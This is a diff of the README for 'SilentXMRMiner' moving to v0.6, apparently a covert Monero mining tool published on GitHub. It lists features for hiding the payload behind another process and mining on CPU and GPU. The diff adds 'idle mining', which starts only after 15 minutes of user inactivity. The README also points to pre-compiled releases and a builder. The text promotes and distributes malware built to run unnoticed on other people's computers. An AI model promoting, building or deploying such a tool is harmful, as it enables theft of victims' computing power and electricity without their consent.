@@ -1,7 +1,7 @@
 
-<img src="https://i.imgur.com/TrL7CLp.png">
+<img src="https://i.imgur.com/KBhYoNs.png">
 
-# SilentXMRMiner v0.5 - Based on Lime Miner v0.3
+# SilentXMRMiner v0.6 - Based on Lime Miner v0.3
 
 
 ## Main Features
@@ -13,6 +13,8 @@
 * Injection - Hide payload behind another process
 
 * CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
+
+* Idle Mining - Can be configured to only mine when computer is idle
   
  
 ## Prerequisites
@@ -29,6 +31,12 @@ Pre-Compiled: https://github.com/UnamSanctam/SilentXMRMiner/releases
 
 ## Changes
 
+# v0.6 (21/04/2020)
+* Updated miner
+* Added custom Idle option to miner (Starts mining after 15 minutes of inactivity and stops when active again)
+* Added more options in the builder (Enable/Disable CPU, Nicehash and Idle mining)
+* Fixed driver paths
+* Reworked some code
 # v0.5 (09/04/2020)
 * Updated miner
 * Massively improved file size by compressing libraries
